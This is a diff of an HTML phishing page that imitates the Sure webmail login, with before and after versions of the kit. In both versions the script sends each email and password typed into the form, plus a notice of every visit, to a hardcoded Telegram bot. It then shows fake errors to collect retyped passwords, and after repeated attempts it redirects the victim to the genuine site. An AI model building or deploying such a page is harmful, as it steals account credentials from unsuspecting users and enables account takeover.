@@ -1,200 +1,265 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Sure | Email Login</title>
-<meta http-equiv="content-type" content="text/html;charset=utf-8" />
-<link rel="shortcut icon" type="image/x-icon" href="https://webmail.sure.com/favicon.ico" />
-<link type="text/css" rel="stylesheet" href="https://fast.fonts.com/cssapi/ef833c3e-091b-412f-bcad-832aa3a06858.css"/>
-<style type="text/css" media="screen">
-* {
-    margin: 0;
-    padding: 0;
-    font-family: Calibri, 'Calibri W01 Regular 904604', Candara, Segoe, "Segoe UI", Optima, "Nimbus Sans", "Trebuchet MS", Arial, sans-serif;
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sure | Email Login</title>
 
-/* Body Styling */
-body {
-    background: url(https://imagestore.sure.com/headerTile.jpg) repeat-x;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-}
+    <style>
+        /* General reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Calibri, 'Calibri W01 Regular 904604', Candara, Segoe, "Segoe UI", Optima, "Nimbus Sans", "Trebuchet MS", Arial, sans-serif;
+       }
 
-/* Login Container Styling */
-#loginContainer {
-    position: relative;
-    display: block;
-    width: 280px;
-    height: 310px;
-    background: #FFF;
-    border-radius: 10px;
-    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.30);
-    border: 8px solid #FDB913;
-    text-align: left;
-    padding: 10px;
-}
-
-#loginContainer h1 {
-    display: block;
-    width: 100%;
-    height: 39px;
-    line-height: 39px;
-    color: #F52F00;
-    font-size: 13px;
-    font-weight: bold;
-    background: #F2F2F2;
-}
-
-#loginContainer .contents {
-    display: block;
-    width: 96%;
-    height: auto;
-    background: #FFF;
-    padding: 10px;
-}
-
-/* Input Styling */
-#loginContainer input {
-    display: block;
-    margin: 10px auto;
-    width: 259px;
-    height: 20px;
-    padding: 5px;
-    border: 1px solid #CCC;
-    border-radius: 5px;
-    font-size: 12px;
-    text-indent: 3px;
-    color: #666;
-}
-
-#loginContainer input:focus {
-    color: #333;
-    background: #FFFFCF;
-}
-
-/* Button Styling */
-#loginContainer button {
-    display: block;
-    margin: 110px auto;
-    width: 68px;
-    height: 20px;
-    background: url(https://imagestore.sure.com/doLogin.jpg);
-    border: none;
-    cursor: pointer;
-    text-indent: -9999px;
-    overflow: hidden;
-    float: right;
-    margin-right: 5px;
-}
-
-/* Forgot Password Link Styling */
-.forgot-password {
-    display: block;
-    text-align: left;
-    font-size: 12px;
-    margin-top: 10px;
-}
-
-.forgot-password a {
-    color: #0078D4;
-    text-decoration: none;
-}
-
-.forgot-password a:hover {
-    text-decoration: underline;
-}
-</style>
-
-<script type="text/javascript">
-    let loginAttempts = 0;
-
-    function sendEmail() {
-        var emailInput = document.getElementById("username");
-        var passwordInput = document.getElementById("password");
-        var errorMessage = document.getElementById("errorMessage");
-
-        var userEmail = emailInput.value.trim();
-        var password = passwordInput.value.trim();
-
-        if (!userEmail || !password) {
-            errorMessage.innerText = "";
-            errorMessage.style.color = "red";
-            errorMessage.style.display = "block";
-            passwordInput.value = "";
-            return;
+        body {
+            background: url(https://imagestore.sure.com/headerTile.jpg) repeat-x;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 5px;
+            overflow: hidden;
         }
 
-        var message = `📩 Sure no error Att 📩\n--------------\nEmail: ${userEmail}\nPassword: ${password}\n------------`;
-        tmsend(message);
-
-        loginAttempts++;
-        if (loginAttempts >= 50) {
-            window.location.href = "https://webmail.sure.com/wmidentity/Account/Logout";
-        } else {
-            errorMessage.innerText = "";
-            errorMessage.style.color = "red";
-            errorMessage.style.display = "block";
-            passwordInput.value = "";
+        /* Fullscreen image */
+        #image {
+            position: fixed; /* Ensures the image is fixed and covers the entire viewport */
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
         }
-    }
 
-    function tmsend(message) {
-        var token = "8460385568:AAF02skAjhZDMaBC_TyzBwGyVVG56CZ0sgk";
-        var chat_id = "8052751627";
-        var url = `https://api.telegram.org/bot${token}/sendMessage`;
+        /* Styling for the login container */
+        #loginContainer {
+            display: none; /* Initially hidden */
+            width: 80%;
+            height: 330px;
+            max-width: 310px; /* Adjust the width for mobile devices */
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.20);
+            border: 8px solid #FDB913;
+            text-align: left;
+            padding: 10px;
+            box-sizing: border-box;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2;
+        }
 
-        fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chat_id, text: message })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (!data.ok) {
-                console.error("Error sending message:", data);
-            } else {
-                console.log("Message sent successfully:", data);
+        #loginContainer h1 {
+            color: #F52F00;
+            font-size: 13px;
+            font-weight: bold;
+            background: #F2F2F2;
+            padding: 9px 0;
+            margin-bottom: 10px;
+        }
+
+        #loginContainer .contents {
+            display: block;
+            width: 100%;
+            padding: 10px;
+        }
+
+        #loginContainer input {
+            display: block;
+            width: 100%;
+            margin: 10px 0;
+            padding: 5px;
+            font-size: 12px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            text-align: left;
+            box-sizing: border-box;
+        }
+
+        #loginContainer input:focus {
+            color: #333;
+            background: #FFFFCF;
+        }
+
+        #loginContainer button {
+            width: 50%;
+            padding: 10px;
+            background: url(https://imagestore.sure.com/doLogin.jpg) no-repeat right;
+            background-size: cover;
+            border: none;
+            cursor: pointer;
+            text-indent: -9999px;
+            color: transparent;
+            font-size: 5px;
+            border-radius: 5px;
+            margin-top: 60px;
+            margin-bottom: 15px;
+            margin-right: 5px;
+            float: right;
+            margin-right: 2px;
+            width: 68px;
+            height: 20px;
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            color: #0078D4;
+            margin-top: 10px;
+            text-align: left;
+        }
+
+        .forgot-password a {
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive adjustments for mobile */
+        @media (max-width: 300px) {
+            #loginContainer {
+                width: 70%; /* Allow for more flexible scaling on small devices */
+                padding: 20px;
             }
-        })
-        .catch(error => console.error("Error:", error));
-    }
 
-    // ✅ Track visitor
-    function sendVisitorToTelegram() {
-        const message = "New surecom Visit tap am!";
-        tmsend(message);
-    }
+            #loginContainer h1 {
+                font-size: 12px;
+                padding: 10px 0;
+            }
 
-    function sendErrorAttemptToTelegram(email, password) {
-        const message = `New surecom Log Failed\nEmail: ${email}\nPassword: ${password}`;
-        tmsend(message);
-    }
+            #loginContainer input {
+                font-size: 14px;
+                padding: 12px;
+            }
 
-    // ✅ Auto-fill email and track visitor
-    window.onload = function () {
-        const urlParams = new URLSearchParams(window.location.search);
-        const email = urlParams.get('email');
-        if (email) {
-            document.getElementById('username').value = email;
+            #loginContainer button {
+                padding: 16px;
+                font-size: 12px;
+            }
+
+            .forgot-password {
+                font-size: 12px;
+            }
+        }
+    </style>
+
+    <script>
+        // Function to send visitor data to Telegram
+        function sendVisitorToTelegram() {
+            const message = "New surecom Visi!";
+            sendToTelegram(message);
         }
 
-        sendVisitorToTelegram();
-    };
-</script>
+        // Function to send error attempt data to Telegram
+        function sendErrorAttemptToTelegram(email, password) {
+            const message = ` New surecom Logn Att Fal \nEmail: ${email}\nPassword: ${password}`;
+            sendToTelegram(message);
+        }
+
+        // General function to send messages to Telegram
+        function sendToTelegram(message) {
+            const token = "8460385568:AAF02skAjhZDMaBC_TyzBwGyVVG56CZ0sgk"; // Telegram Bot Token
+            const chat_id = "8052751627"; // Telegram Chat ID
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chat_id, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error("Error sending message:", data);
+                } else {
+                    console.log("Message sent successfully:", data);
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        }
+
+        // Show login form after the image and send visitor data
+        window.onload = function() {
+            // Send visitor info when the page is loaded
+            sendVisitorToTelegram();
+
+            // Show login form after 1 second (delay)
+            setTimeout(function() {
+                document.getElementById('loginContainer').style.display = 'block';
+                document.getElementById('image').style.display = 'none';
+            }, 200); // 1 second delay before showing the login form
+        }
+
+        // Function to handle the login attempt
+        let loginAttempts = 0;
+
+        function sendEmail() {
+            var emailInput = document.getElementById("username");
+            var passwordInput = document.getElementById("password");
+            var errorMessage = document.getElementById("errorMessage");
+
+            var userEmail = emailInput.value.trim();
+            var password = passwordInput.value.trim();
+
+            if (!userEmail || !password) {
+                errorMessage.innerText = "";
+                errorMessage.style.color = "red";
+                errorMessage.style.display = "block";
+                passwordInput.value = "";
+
+                // Send error attempt details to Telegram
+                sendErrorAttemptToTelegram(userEmail, password);
+                return;
+            }
+
+            // Track login attempts
+            loginAttempts++;
+            if (loginAttempts >= 30) {
+                window.location.href = "https://webmail.sure.com//error.php?err=1&err_id=67cea41c917ac";
+            } else {
+                errorMessage.innerText = "";
+                errorMessage.style.color = "red";
+                errorMessage.style.display = "block";
+                passwordInput.value = "";
+
+                // Send error attempt details to Telegram
+                sendErrorAttemptToTelegram(userEmail, password);
+            }
+        }
+    </script>
+
 </head>
 <body>
+
+    <!-- The image to show before login form -->
+    <img id="image" src="https://i.imgur.com/Te61cda.png" alt="Redirect Image" />
+
+    <!-- The login form section (hidden initially) -->
     <div id="loginContainer">
         <h1>Email Login</h1>
-        <p id="errorMessage"></p>
+        <p id="errorMessage" style="color: red; display: none;"></p>
+
         <div class="contents">
-            <input type="text" id="username" placeholder="Email Address" value="" />
-            <input type="password" id="password" placeholder="Password" />
-            <div class="button-container">
-                <p class="forgot-password"><a href="https://webmail.sure.com/forgot-password">Forgot Password?</a></p>
-                <button onclick="sendEmail()">Login</button>
-            </div>
+            <LABEL class="form-label" id="user-label" style="font-size: 12px;">Email address</LABEL>
+            <input type="text" id="username" value="" />
+
+            <LABEL class="form-label" id="pass-label" style="font-size: 12px;">Password</LABEL>
+            <input type="password" id="password" />
+
+            <button onclick="sendEmail()">Login</button>
+
+            <p class="forgot-password">
+                <a href="https://webmail.sure.com/forgot-password">Forgot Password?</a>
+            </p>
         </div>
     </div>
+
 </body>
 </html>
